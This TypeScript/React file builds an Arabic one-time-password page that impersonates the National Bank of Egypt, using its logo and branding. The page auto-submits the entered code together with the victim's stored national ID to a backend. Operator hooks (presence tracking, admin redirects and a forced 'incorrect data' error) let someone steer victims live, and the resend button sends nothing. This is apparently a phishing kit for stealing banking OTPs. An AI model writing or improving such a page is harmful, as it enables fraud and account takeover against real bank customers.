/**
 * البنك الأهلي المصري - رمز OTP (6 خانات مع عداد 5 دقائق وإرسال تلقائي)
 * تصميم داكن احترافي موحد
 */
import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";

export default function OTP() {
  usePresence("otp");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [timer, setTimer] = useState(300);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const phone = sessionStorage.getItem("pw_phone") || "XXXXXXXXXX";
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const saveOtpData = trpc.applications.saveOtpData.useMutation();

  useEffect(() => {
    const showError = sessionStorage.getItem("pw_show_error");
    if (showError === "true") {
      setErrorMsg("البيانات المدخلة غير صحيحة، يرجى إعادة الإدخال بشكل صحيح");
      setOtp(["", "", "", "", "", ""]);
      sessionStorage.removeItem("pw_show_error");
      inputRefs.current[0]?.focus();
    }
  }, []);

  useEffect(() => {
    const interval = setInterval(() => setTimer((prev) => (prev > 0 ? prev - 1 : 0)), 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTimer = (s: number) => `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;
  const maskedPhone = phone.length > 4 ? phone.slice(-4) + "*******" : phone;

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleSubmit = async () => {
    const code = otp.join("");
    if (code.length < 6) { setErrorMsg("يرجى إدخال الرمز كاملاً"); return; }
    if (!nationalId) { setErrorMsg("يرجى إكمال البيانات الشخصية أولاً"); return; }
    setErrorMsg("");
    setLoading(true);
    try {
      sessionStorage.setItem("pw_last_page", "otp");
      await saveOtpData.mutateAsync({ nationalId, otpCode: code });
      setLocation("/processing");
    } catch (err) {
      console.error(err);
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  useEffect(() => {
    if (otp.every((d) => d !== "") && !loading) handleSubmit();
  }, [otp]);

  return (
    <div dir="rtl" style={{ width: "100%", maxWidth: "100vw", minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", position: "relative", overflowX: "hidden" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ width: "100%", maxWidth: "520px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column", position: "relative", zIndex: 1, boxSizing: "border-box" }}>
        {/* Header */}
        <div style={{ padding: "20px 24px", textAlign: "center", borderBottom: "1px solid #e5e7eb", position: "relative" }}>
          <button onClick={() => setLocation("/")} style={{ position: "absolute", top: "50%", left: "16px", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", padding: "4px" }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke="#999" strokeWidth="2.5" strokeLinecap="round"/></svg>
          </button>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "10px" }}>
            <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "auto", maxHeight: "42px", maxWidth: "180px", width: "100%", display: "block", objectFit: "contain" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          </div>
          <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "20px", margin: 0 }}>الرقم السري المتغير (OTP)</h2>
        </div>

        {/* Content */}
        <div style={{ padding: "32px 24px", flex: 1 }}>
          {errorMsg && (
            <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "12px 16px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>
          )}

          {/* SMS Icon */}
          <div style={{ textAlign: "center", marginBottom: "20px" }}>
            <div style={{ width: "64px", height: "64px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto", border: "2px solid #dcfce7" }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="#1B7A3D" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>

          <h4 style={{ textAlign: "center", fontWeight: "800", marginBottom: "8px", color: "#1a1a1a", fontSize: "18px" }}>رمز التحقق</h4>
          <p style={{ textAlign: "center", color: "#666", fontSize: "14px", marginBottom: "28px" }}>
            تم إرسال رمز التحقق إلى رقم الهاتف{" "}
            <span style={{ color: "#1B7A3D", fontWeight: "700", direction: "ltr", display: "inline-block" }}>{maskedPhone}</span>
          </p>

          {/* OTP Inputs */}
          <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginBottom: "24px", direction: "ltr" }}>
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                style={{ width: "44px", height: "52px", textAlign: "center", fontSize: "22px", fontWeight: "700", border: `2px solid ${digit ? "#1B7A3D" : "#d1d5db"}`, borderRadius: "10px", outline: "none", fontFamily: "'Cairo', sans-serif", background: "#f9fafb", color: "#1a1a1a", transition: "border-color 0.2s" }}
              />
            ))}
          </div>

          {/* Timer */}
          <div style={{ textAlign: "center", marginBottom: "28px" }}>
            <span style={{ fontSize: "32px", fontWeight: "800", color: timer > 60 ? "#1B7A3D" : "#dc2626", direction: "ltr", display: "inline-block" }}>
              {formatTimer(timer)}
            </span>
            <p style={{ color: "#999", fontSize: "13px", marginTop: "4px" }}>
              {timer > 0 ? "الوقت المتبقي لانتهاء الرمز" : "انتهت مدة الرمز"}
            </p>
          </div>

          <button onClick={handleSubmit} disabled={loading || otp.some(d => !d)}
            style={{ width: "100%", background: otp.every(d => d) ? "linear-gradient(135deg, #1B7A3D, #145a2c)" : "#e5e7eb", color: otp.every(d => d) ? "white" : "#999", border: "none", borderRadius: "12px", padding: "16px", fontSize: "16px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: otp.every(d => d) ? "0 6px 25px rgba(27,122,61,0.3)" : "none" }}>
            {loading ? "جاري التحقق..." : "تأكيد الرمز"}
          </button>

          {timer === 0 && (
            <button onClick={() => { setTimer(300); setOtp(["", "", "", "", "", ""]); }}
              style={{ width: "100%", background: "none", border: "1px solid #1B7A3D", color: "#1B7A3D", borderRadius: "12px", padding: "14px", fontSize: "14px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif", marginTop: "12px" }}>
              إعادة إرسال الرمز
            </button>
          )}
        </div>

        <footer style={{ textAlign: "center", padding: "16px", borderTop: "1px solid #e5e7eb" }}>
          <small style={{ color: "#999", fontSize: "11px" }}>© 2026 البنك الأهلي المصري - مصر</small>
        </footer>
      </div>
    </div>
  );
}
